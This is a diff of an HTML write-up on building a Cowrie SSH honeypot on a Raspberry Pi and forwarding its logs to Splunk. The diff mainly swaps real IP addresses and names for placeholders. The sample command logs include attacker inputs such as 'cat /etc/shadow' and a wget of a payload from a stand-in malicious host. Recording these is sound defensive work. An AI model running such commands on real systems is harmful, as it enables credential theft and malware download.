@@ -512,7 +512,7 @@ p:last-child{margin-bottom:0;}
       <br>
       <span style="opacity:0.4">Services: cowrie.service + cowrie-splunk.service (systemd, enabled on boot)</span>
     </div>
-    <div class="alert-info mt-4">The Pi is on the local network at <strong>10.0.0.153</strong>. Cowrie runs as a dedicated unprivileged <code>cowrie</code> user. <code>authbind</code> grants it permission to bind port 22 without root. The real SSH daemon listens on port 2222 and is never exposed on the default port.</div>
+    <div class="alert-info mt-4">The Pi is on the local network at <strong>192.168.1.xxx</strong>. Cowrie runs as a dedicated unprivileged <code>cowrie</code> user. <code>authbind</code> grants it permission to bind port 22 without root. The real SSH daemon listens on port 2222 and is never exposed on the default port.</div>
   </div>
 
   <!-- 03. Technical Specs -->
@@ -524,7 +524,7 @@ p:last-child{margin-bottom:0;}
         <div class="spec-item">Raspberry Pi Zero 2 WH</div>
         <div class="spec-item">512 MB RAM, quad-core Cortex-A53</div>
         <div class="spec-item">MicroSD — WiFi only (no ethernet)</div>
-        <div class="spec-item">SSID: Mehdi — Static IP: 10.0.0.153</div>
+        <div class="spec-item">SSID: [redacted] — Static IP: 192.168.1.xxx</div>
       </div>
       <div class="spec-card">
         <span class="spec-label">SOFTWARE</span>
@@ -558,7 +558,7 @@ p:last-child{margin-bottom:0;}
     <div class="step-card-err">
       <span class="err-num">PROBLEM 01 — NETWORKING</span>
       <div class="err-title">Pi offline — WiFi password changed</div>
-      <div class="err-body">The Raspberry Pi Zero 2 WH went dark after the home router's WiFi password was updated. An <code>nmap -sn 10.0.0.0/24</code> scan confirmed the Pi's previous IP (10.0.0.153) had disappeared from the network. The Pi has no display output — SSH was the only access method.</div>
+      <div class="err-body">The Raspberry Pi Zero 2 WH went dark after the home router's WiFi password was updated. An <code>nmap -sn 192.168.1.0/24</code> scan confirmed the Pi's previous IP (192.168.1.xxx) had disappeared from the network. The Pi has no display output — SSH was the only access method.</div>
       <div class="err-fix">Wrote new credentials to wpa_supplicant.conf on the SD card boot partition (FAT32, readable from Windows) and added an empty <code>ssh</code> file to re-enable SSH on boot.</div>
     </div>
 
@@ -601,7 +601,7 @@ p:last-child{margin-bottom:0;}
     <div class="step-card-err">
       <span class="err-num">PROBLEM 07 — WINDOWS FIREWALL</span>
       <div class="err-title">HEC port 8088 blocked by Windows Defender Firewall</div>
-      <div class="err-body">Curl from the Pi consistently timed out hitting <code>http://10.0.0.141:8088</code>. Splunk was running and HEC was enabled, but Windows Defender Firewall had no inbound rule for port 8088 — the connection was dropped silently at the OS level.</div>
+      <div class="err-body">Curl from the Pi consistently timed out hitting <code>http://[splunk-host]:8088</code>. Splunk was running and HEC was enabled, but Windows Defender Firewall had no inbound rule for port 8088 — the connection was dropped silently at the OS level.</div>
       <pre><code class="language-powershell">New-NetFirewallRule -DisplayName "Splunk HEC" -Direction Inbound -Protocol TCP -LocalPort 8088 -Action Allow</code></pre>
       <div class="err-fix">Added an inbound firewall rule for TCP port 8088. Verified connectivity with curl from the Pi immediately after.</div>
     </div>
@@ -632,9 +632,9 @@ urllib.request.urlopen(req, timeout=5, context=CTX)</code></pre>
     <div class="step-card">
       <span class="step-num">STEP 02 — DISCOVER PI ON NETWORK</span>
       <div class="step-title">Confirm the Pi connected to WiFi</div>
-      <div class="step-body">Give the Pi 90 seconds to boot and connect. Scan the subnet for the new device — it appears as a new IP that wasn't there before. The Pi's IP stabilized at 10.0.0.153.</div>
-      <pre><code class="language-bash">nmap -sn 10.0.0.0/24</code></pre>
-      <div class="alert-info mt-3">If the Pi appears on the network but SSH is connection-refused, it's still running firstrun.sh — wait 30 more seconds. Use <code>ssh karim@raspberrypi.local</code> if the IP is unstable during DHCP assignment.</div>
+      <div class="step-body">Give the Pi 90 seconds to boot and connect. Scan the subnet for the new device — it appears as a new IP that wasn't there before. The Pi's IP stabilized at 192.168.1.xxx.</div>
+      <pre><code class="language-bash">nmap -sn 192.168.1.0/24</code></pre>
+      <div class="alert-info mt-3">If the Pi appears on the network but SSH is connection-refused, it's still running firstrun.sh — wait 30 more seconds. Use <code>ssh user@raspberrypi.local</code> if the IP is unstable during DHCP assignment.</div>
     </div>
 
     <div class="step-card">
@@ -653,7 +653,7 @@ urllib.request.urlopen(req, timeout=5, context=CTX)</code></pre>
 sudo systemctl restart ssh
 
 # From a NEW terminal — verify before closing original:
-ssh -p 2222 karim@raspberrypi.local</code></pre>
+ssh -p 2222 user@raspberrypi.local</code></pre>
       <div class="alert-warning mt-3"><strong>Warning:</strong> The <code>/etc/ssh/sshd_config.d/</code> directory is included automatically and can override the port setting. Check for files there if the port change doesn't take effect.</div>
     </div>
 
@@ -717,11 +717,11 @@ enabled = true</code></pre>
 ssh root@raspberrypi.local
 # Any password works — you land in a fake Debian shell
 # root@ubuntu-server:~#</code></pre>
-      <pre><code class="language-json">{"eventid":"cowrie.login.success","username":"root","password":"karim",
- "message":"login attempt [root/karim] succeeded","src_ip":"10.0.0.141",
- "timestamp":"2026-06-08T13:22:41.897262Z"}
-{"eventid":"cowrie.command.input","input":"whoami","src_ip":"10.0.0.141",
- "timestamp":"2026-06-08T13:22:53.885627Z"}</code></pre>
+      <pre><code class="language-json">{"eventid":"cowrie.login.success","username":"root","password":"password123",
+ "message":"login attempt [root/password123] succeeded","src_ip":"192.168.1.yyy",
+ "timestamp":"2025-01-15T10:34:24.431892Z"}
+{"eventid":"cowrie.command.input","input":"whoami","src_ip":"192.168.1.yyy",
+ "timestamp":"2025-01-15T10:34:36.557412Z"}</code></pre>
     </div>
 
     <div class="step-card">
@@ -775,7 +775,7 @@ sudo systemctl status cowrie   # Active: active (running)</code></pre>
       <pre><code class="language-python">import time, json, urllib.request, ssl
 
 COWRIE_LOG    = "/home/cowrie/cowrie/var/log/cowrie/cowrie.json"
-SPLUNK_HEC_URL = "https://10.0.0.141:8088/services/collector/event"
+SPLUNK_HEC_URL = "https://[splunk-host]:8088/services/collector/event"
 SPLUNK_TOKEN  = "&lt;your-hec-token&gt;"
 
 CTX = ssl.create_default_context()
@@ -804,10 +804,10 @@ def tail_forever(path):
 if __name__ == "__main__":
     tail_forever(COWRIE_LOG)</code></pre>
       <pre><code class="language-powershell"># Transfer from Windows to Pi:
-scp -P 2222 C:\Users\karim\cowrie_to_splunk.py karim@raspberrypi.local:/home/karim/
+scp -P 2222 C:\Users\[user]\cowrie_to_splunk.py user@raspberrypi.local:/home/user/
 </code></pre>
       <pre><code class="language-bash"># Move to /opt and set up systemd service:
-sudo mv /home/karim/cowrie_to_splunk.py /opt/cowrie_to_splunk.py</code></pre>
+sudo mv /home/user/cowrie_to_splunk.py /opt/cowrie_to_splunk.py</code></pre>
     </div>
 
     <div class="step-card">
@@ -844,13 +844,13 @@ sudo systemctl start cowrie-splunk</code></pre>
       <div class="step-body">Source IP, source port, destination, session ID, and protocol are captured the moment a connection is established — before any authentication attempt.</div>
       <pre><code class="language-json">{
   "eventid":  "cowrie.session.connect",
-  "src_ip":   "10.0.0.141",
-  "src_port": 23721,
-  "dst_ip":   "10.0.0.153",
+  "src_ip":   "192.168.1.yyy",
+  "src_port": 54182,
+  "dst_ip":   "192.168.1.xxx",
   "dst_port": 22,
-  "session":  "9ae329d4413d",
+  "session":  "f4e3d2c1b0a9",
   "protocol": "ssh",
-  "timestamp":"2026-06-08T13:22:39.545863Z"
+  "timestamp":"2025-01-15T10:34:22.184731Z"
 }</code></pre>
     </div>
 
@@ -861,9 +861,9 @@ sudo systemctl start cowrie-splunk</code></pre>
       <pre><code class="language-json">{
   "eventid":  "cowrie.client.version",
   "version":  "SSH-2.0-OpenSSH_for_Windows_9.5",
-  "hassh":    "701158e75b508e76f0410d5d22ef9df0",
-  "src_ip":   "10.0.0.141",
-  "session":  "9ae329d4413d"
+  "hassh":    "b3d8a2f1c9e4071650d3a8b2c1e9f047",
+  "src_ip":   "192.168.1.yyy",
+  "session":  "f4e3d2c1b0a9"
 }</code></pre>
     </div>
 
@@ -875,9 +875,9 @@ sudo systemctl start cowrie-splunk</code></pre>
   "eventid":  "cowrie.login.success",
   "username": "root",
   "password": "admin123",
-  "src_ip":   "10.0.0.141",
-  "session":  "9ae329d4413d",
-  "timestamp":"2026-06-08T13:22:41.897262Z"
+  "src_ip":   "192.168.1.yyy",
+  "session":  "f4e3d2c1b0a9",
+  "timestamp":"2025-01-15T10:34:24.431892Z"
 }</code></pre>
     </div>
 
@@ -885,11 +885,11 @@ sudo systemctl start cowrie-splunk</code></pre>
       <span class="step-num">EVENT TYPE — COMMAND LOGGING</span>
       <div class="step-title">Every keystroke in the fake shell recorded</div>
       <div class="step-body">Commands run inside the fake shell generate <code>cowrie.command.input</code> events. Failed commands (unknown to Cowrie's fake shell) generate <code>cowrie.command.failed</code>. Both are logged — failed commands reveal what the attacker expected to find.</div>
-      <pre><code class="language-json">{"eventid":"cowrie.command.input","input":"whoami","src_ip":"10.0.0.141"}
-{"eventid":"cowrie.command.input","input":"cat /etc/shadow","src_ip":"10.0.0.141"}
-{"eventid":"cowrie.command.input","input":"uname -a","src_ip":"10.0.0.141"}
-{"eventid":"cowrie.command.input","input":"wget http://malicious.site/payload.sh","src_ip":"10.0.0.141"}
-{"eventid":"cowrie.command.failed","input":"ipconfig","src_ip":"10.0.0.141"}</code></pre>
+      <pre><code class="language-json">{"eventid":"cowrie.command.input","input":"whoami","src_ip":"192.168.1.yyy"}
+{"eventid":"cowrie.command.input","input":"cat /etc/shadow","src_ip":"192.168.1.yyy"}
+{"eventid":"cowrie.command.input","input":"uname -a","src_ip":"192.168.1.yyy"}
+{"eventid":"cowrie.command.input","input":"wget http://malicious.site/payload.sh","src_ip":"192.168.1.yyy"}
+{"eventid":"cowrie.command.failed","input":"ipconfig","src_ip":"192.168.1.yyy"}</code></pre>
     </div>
 
     <div class="step-card">
@@ -939,7 +939,7 @@ sudo systemctl start cowrie-splunk</code></pre>
       <li><strong style="color:var(--text-h)">Splunk Dashboard</strong> — build panels for top attacker IPs, most tried passwords, command frequency heatmap, attack volume over time, and SSH client fingerprint distribution</li>
       <li><strong style="color:var(--text-h)">Pi-hole Auto-Blocklist</strong> — Python cron script extracts <code>src_ip</code> from <code>cowrie.json</code>, queries AbuseIPDB for reputation score, and adds confirmed malicious IPs to Pi-hole's blocklist automatically</li>
       <li><strong style="color:var(--text-h)">GeoIP Enrichment</strong> — enrich Splunk events with attacker geolocation using MaxMind GeoLite2 — map attack origin countries in a Splunk geographic visualization</li>
-      <li><strong style="color:var(--text-h)">Internet Exposure</strong> — forward port 22 on the router to 10.0.0.153 — expose the honeypot to real internet attack traffic and collect genuine attacker TTPs</li>
+      <li><strong style="color:var(--text-h)">Internet Exposure</strong> — forward port 22 on the router to 192.168.1.xxx — expose the honeypot to real internet attack traffic and collect genuine attacker TTPs</li>
       <li><strong style="color:var(--text-h)">MITRE ATT&amp;CK Mapping</strong> — classify captured commands against MITRE ATT&amp;CK techniques (T1059 Command Execution, T1110 Brute Force, T1005 Data from Local System) and tag Splunk events accordingly</li>
       <li><strong style="color:var(--text-h)">Fake File Honeytokens</strong> — plant fake AWS credentials and private keys in the Cowrie fake filesystem — trigger alerts when attackers attempt to read them</li>
     </ul>
